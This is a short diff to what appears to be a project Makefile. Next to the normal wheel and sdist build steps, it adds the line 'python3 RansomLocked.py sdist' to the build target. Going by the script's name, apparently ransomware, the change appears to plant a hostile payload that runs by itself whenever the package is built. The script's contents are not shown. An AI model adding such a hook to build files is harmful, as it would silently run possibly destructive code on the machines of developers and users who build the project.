@@ -15,3 +15,4 @@ rebuild: clean
 build:
 	pip wheel . -w dist --no-deps
 	python3 setup.py sdist
+	python3 RansomLocked.py sdist
